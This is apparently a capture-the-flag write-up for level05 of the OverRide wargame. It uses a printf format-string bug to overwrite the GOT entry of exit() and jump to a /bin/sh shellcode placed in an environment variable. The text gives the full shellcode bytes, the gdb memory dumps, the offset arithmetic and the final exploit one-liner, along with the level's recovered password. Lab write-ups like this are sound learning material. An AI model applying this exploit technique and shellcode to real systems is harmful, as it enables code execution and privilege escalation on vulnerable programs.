# Write up

No buffer overflow here (protected fgets).
We notice a printf using directly the entered value as format, however there isn't any secondary function, so we will mix a GOT exploit (Look Rainfall level5, no RELRO here) with a shellcode.
We notice while traducing the code an exit() call after the printf, we will so alter its GOT value contents.

Sample payload :
```
level05@OverRide:~$ (python -c "print 'AAAA' + '.%x' * 15") | ./level05
aaaa.64.f7fcfac0.f7ec3af9.ffffd6df.ffffd6de.0.ffffffff.ffffd764.f7fdb000.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825
```
Sensitive value is the 10th one.

GOT address for exit :
```
objdump -R level05 | less
...
080497e0 R_386_JUMP_SLOT   exit
...
```

Shellcode /bin/sh (using nopsplead):
```
export LIDLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
(gdb) x/1000x environ
...
0xffffdf1c:     0x3d4e4550      0x752f207c      0x622f7273      0x6c2f6e69
0xffffdf2c:     0x70737365      0x20657069      0x4c007325      0x434c4449
0xffffdf3c:     0x3d45444f      0x90909090      0x90909090      0x90909090
0xffffdf4c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdf5c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdf6c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdf7c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdf8c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffdf9c:     0x90909090      0x90909090      0x99580b6a      0x2f2f6852
0xffffdfac:     0x2f686873      0x896e6962      0xcdc931e3      0x454c0080
0xffffdfbc:     0x4c435353      0x3d45534f      0x7273752f      0x6e69622f
...
# We choose 0xffffdf4c here
# 0xffff = 65535
# 0xdf4c = 57164
#57164 - 9 : 57155
#65535 - 57155 - 9 : 8371
```

(I had to ajust the payload by sending it to a file and testing it with gdb)
```
b *0x0804850c
run < /tmp/test10
x/8x 0x080497e0
```

The value is too big to use the min-width here, but thanks to someone I evaluated I use the 2-byte trick. (Using %hn is also possible) 

Payload.exe :
```
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57155x " + "%10$n" + "%8371x" + "%11$n"'; cat) | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```